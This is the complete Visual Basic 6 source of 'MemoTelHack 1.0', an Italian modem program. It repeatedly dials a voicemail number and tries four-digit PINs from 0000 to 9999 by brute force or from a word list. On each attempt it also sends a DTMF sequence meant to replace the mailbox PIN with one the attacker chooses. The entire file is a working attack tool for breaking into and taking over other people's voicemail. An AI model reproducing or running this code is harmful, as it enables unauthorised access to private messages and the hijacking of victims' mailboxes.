VERSION 5.00
Object = "{648A5603-2C6E-101B-82B6-000000000014}#1.1#0"; "MSCOMM32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "~ MemoTelHack 1.0 ~ by: ^SiD^ & mR_bIs0n"
   ClientHeight    =   5025
   ClientLeft      =   4545
   ClientTop       =   3600
   ClientWidth     =   6330
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5025
   ScaleWidth      =   6330
   Begin VB.Frame Frame8 
      Caption         =   "Opzioni"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4335
      Left            =   4200
      TabIndex        =   17
      Top             =   0
      Width           =   2055
      Begin VB.Frame Frame11 
         Caption         =   "Pause (ms)"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3495
         Left            =   120
         TabIndex        =   22
         Top             =   720
         Width           =   1815
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            Height          =   195
            Left            =   240
            TabIndex        =   32
            Text            =   "5000"
            Top             =   2160
            Width           =   1335
         End
         Begin VB.TextBox Text12 
            Appearance      =   0  'Flat
            Height          =   195
            Left            =   240
            TabIndex        =   26
            Text            =   "1000"
            Top             =   960
            Width           =   1335
         End
         Begin VB.TextBox Text11 
            Appearance      =   0  'Flat
            Height          =   195
            Left            =   240
            TabIndex        =   25
            Text            =   "7000"
            Top             =   1440
            Width           =   1335
         End
         Begin VB.TextBox Text10 
            Appearance      =   0  'Flat
            Height          =   195
            Left            =   240
            TabIndex        =   24
            Text            =   "1000"
            Top             =   2880
            Width           =   1335
         End
         Begin VB.TextBox Text9 
            Appearance      =   0  'Flat
            Height          =   195
            Left            =   240
            TabIndex        =   23
            Text            =   "40000"
            Top             =   480
            Width           =   1335
         End
         Begin VB.Label Label2 
            Caption         =   "Conferma Codice, Invio:  #"
            Height          =   375
            Left            =   240
            TabIndex        =   33
            Top             =   2400
            Width           =   1335
         End
         Begin VB.Label Label11 
            Caption         =   "Componi Numero"
            Height          =   255
            Left            =   240
            TabIndex        =   31
            Top             =   240
            Width           =   1335
         End
         Begin VB.Label Label10 
            Caption         =   "Invio: #"
            Height          =   255
            Left            =   240
            TabIndex        =   30
            Top             =   720
            Width           =   1335
         End
         Begin VB.Label Label9 
            Caption         =   "Invio: Codice + #"
            Height          =   255
            Left            =   240
            TabIndex        =   29
            Top             =   1200
            Width           =   1335
         End
         Begin VB.Label Label8 
            Caption         =   "Invio: 221 + NewCode + #"
            Height          =   375
            Left            =   240
            TabIndex        =   28
            Top             =   1680
            Width           =   1335
         End
         Begin VB.Label Label7 
            Caption         =   "Disconnessione"
            Height          =   255
            Left            =   240
            TabIndex        =   27
            Top             =   3120
            Width           =   1335
         End
      End
      Begin VB.OptionButton Option2 
         Caption         =   "WordList"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         ToolTipText     =   "Attacco WordList"
         Top             =   480
         Value           =   -1  'True
         Width           =   1575
      End
      Begin VB.OptionButton Option1 
         Caption         =   "Bruteforce"
         Height          =   255
         Left            =   240
         TabIndex        =   18
         ToolTipText     =   "Attacco Bruteforce"
         Top             =   240
         Width           =   1575
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Codice da salvare"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   2280
      TabIndex        =   2
      Top             =   0
      Width           =   1815
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   3
         Text            =   "1234"
         ToolTipText     =   "PIN da salvare"
         Top             =   240
         Width           =   1575
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Numero Segreteria"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   2055
      Begin VB.TextBox numero_seg 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   1
         Text            =   "800001999"
         ToolTipText     =   "Numero da chiamare"
         Top             =   240
         Width           =   1815
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Range codici da provare"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   120
      TabIndex        =   4
      Top             =   600
      Width           =   2415
      Begin VB.TextBox Text4 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   1320
         TabIndex        =   6
         Text            =   "9999"
         ToolTipText     =   "Range (fine)"
         Top             =   240
         Width           =   975
      End
      Begin VB.TextBox Text3 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   5
         Text            =   "0000"
         ToolTipText     =   "Range (inizio)"
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "Testing..."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   2640
      TabIndex        =   7
      Top             =   600
      Width           =   1455
      Begin VB.TextBox Text5 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   8
         Text            =   "0000"
         ToolTipText     =   "Testing..."
         Top             =   240
         Width           =   1215
      End
   End
   Begin VB.Frame Frame5 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   120
      TabIndex        =   9
      Top             =   1200
      Width           =   3975
      Begin VB.ComboBox Combo1 
         Height          =   315
         Left            =   2760
         TabIndex        =   16
         ToolTipText     =   "Numero COM"
         Top             =   240
         Width           =   1095
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Stop"
         Enabled         =   0   'False
         Height          =   255
         Left            =   1680
         TabIndex        =   11
         Top             =   240
         Width           =   975
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Start"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   975
      End
      Begin VB.Shape Shape1 
         BackColor       =   &H000000FF&
         BackStyle       =   1  'Opaque
         Height          =   255
         Left            =   1200
         Top             =   240
         Width           =   375
      End
   End
   Begin VB.Frame Frame6 
      Caption         =   "Modem log..."
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2535
      Left            =   120
      TabIndex        =   12
      Top             =   1800
      Width           =   3975
      Begin VB.TextBox log_text 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   2175
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   13
         Top             =   240
         Width           =   3735
      End
   End
   Begin VB.Frame Frame7 
      Caption         =   "Info:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   120
      TabIndex        =   14
      Top             =   4320
      Width           =   3975
      Begin VB.Timer Timer1 
         Left            =   3000
         Top             =   120
      End
      Begin MSCommLib.MSComm MSComm1 
         Left            =   3480
         Top             =   120
         _ExtentX        =   1005
         _ExtentY        =   1005
         _Version        =   393216
         DTREnable       =   -1  'True
         Handshaking     =   1
      End
      Begin VB.Label Label1 
         Caption         =   "Idea by: mR_bIs0n - Coded by: ^SiD^"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   3735
      End
   End
   Begin VB.Frame Frame10 
      Caption         =   "Init String"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   4200
      TabIndex        =   20
      Top             =   4320
      Width           =   2055
      Begin VB.TextBox init_text 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   120
         TabIndex        =   21
         Text            =   "ATX3"
         ToolTipText     =   "Stringa di inizializzazione del modem"
         Top             =   240
         Width           =   1815
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public TimerFlag As Boolean 'Timer Flag
Public StopFlag As Boolean 'Stop Flag

Private Function InviaTono(tono As String)
'Invio di un DTMF
    InviaComando ("ATDT" & tono & ";" & vbCrLf)
    Wait (1000)
End Function

Private Function InviaComando(comando As String)
'Invio di un comando al modem
    MSComm1.Output = comando & vbCr
    log_text.Text = log_text.Text & "-> " & comando & vbCrLf
    Wait (100)
    Call MSComm1_OnComm
    
End Function



Private Sub Command1_Click()
    Command1.Enabled = False
    Command2.Enabled = True
    Call Chiama
End Sub

Private Sub IncWordList()
Dim temp As String
If Not EOF(1) Then 'se il file non è finito
    Input #1, temp 'leggi word
    Text5.Text = temp
End If
End Sub

Private Sub Chiama()

StopFlag = False

    If Option2.Value = True Then Call IncWordList 'carico il primo valore della wordlist

    MSComm1.CommPort = Combo1.ListIndex + 1 'assegno il numero di com
    MSComm1.PortOpen = True 'apro la com
    Wait (1000)
    Do While Text5.Text < Text4.Text And StopFlag = False  'loop
    InviaComando (init_text.Text & vbCrLf) 'inizializzazione
    Wait (500)
    InviaComando ("ATDT" & numero_seg.Text & ";" & vbCrLf)  'componi numero
    Shape1.BackColor = vbGreen
    DoEvents
    Wait (Text9.Text) 'aspetto ke risponda
    DoEvents
    InviaTono ("#") 'cancelletto
    Wait (Text12.Text)
    InviaTono (Text5.Text & "#") 'prova pass
    Wait (Text11.Text)
    InviaTono ("211" & Text2.Text & "#") 'inserisce nuova pass
    Wait (Text1.Text)
    InviaTono ("#") 'conferma codice con #
    Wait (Text10.Text)
    InviaComando ("ATH0") 'hang up
    Shape1.BackColor = vbRed
    DoEvents
    Wait (1000)
    If Option1.Value = True Then
        Call Incrementa 'incremento bruteforce
    Else
        Call IncWordList 'incremento wordlist
    End If
        
    DoEvents
    Loop
    
    MSComm1.PortOpen = False
    Command2.Enabled = False
    Command1.Enabled = True
End Sub

Private Function Incrementa()
Dim temp As String
    If Text5.Text <> Text4.Text Then 'incrementa solo se < di 9999
        Text5.Text = Text5.Text + 1 'incrementa
        temp = Text5.Text
        If Len(Text5.Text) < 4 Then
            Text5.Text = InserisciZero(4 - Len(Text5.Text)) & temp
        End If
    End If
End Function
Private Function InserisciZero(numeroZeri As Integer)
Dim temp
    For i = 1 To numeroZeri
        temp = temp & "0"
    Next
InserisciZero = temp
End Function



Private Sub Command2_Click()
    StopFlag = True
End Sub

Private Sub Form_Load()
'nag screen
    Form2.Visible = True 'carica
    DoEvents
    Wait (1000) 'delay
    Unload Form2 'chiudi

'Carica items
    Combo1.AddItem "COM1"
    Combo1.AddItem "COM2"
    Combo1.AddItem "COM3"
    Combo1.AddItem "COM4"
    Combo1.AddItem "COM5"
    Combo1.AddItem "COM6"
    
    Combo1.ListIndex = 0
    
'Flag del timer
    TimerFlag = False
    
'flag stop
    StopFlag = False
    
'carico wordlist
    On Error Resume Next
    Open Trim(App.Path & "\" & "WordList.txt") For Input As 1
    
'colore label
    Label1.ForeColor = vbBlue
    DoEvents
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Close #1
    Unload Form2
End Sub

Private Sub Frame7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Label1.ForeColor = vbBlue
    DoEvents
End Sub

Private Sub Label1_Click()
    Form2.Visible = True
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Label1.ForeColor = vbRed
    DoEvents
End Sub

Private Sub MSComm1_OnComm()
Dim Ricevuto As String
    Ricevuto = MSComm1.Input 'leggo i dati nel buffer
    log_text.Text = log_text.Text & "<- " & Ricevuto & vbCrLf 'li scrivo nella text box
    
    
End Sub

Private Sub Timer1_Timer()
 TimerFlag = True 'tempo trascorso... setta il flag
 Timer1.Enabled = False
End Sub

Private Function Wait(millisec As Long)
'attendo
    TimerFlag = False
    Timer1.Interval = millisec
    Timer1.Enabled = True
    
    Do While TimerFlag = False
    DoEvents
    Loop
End Function
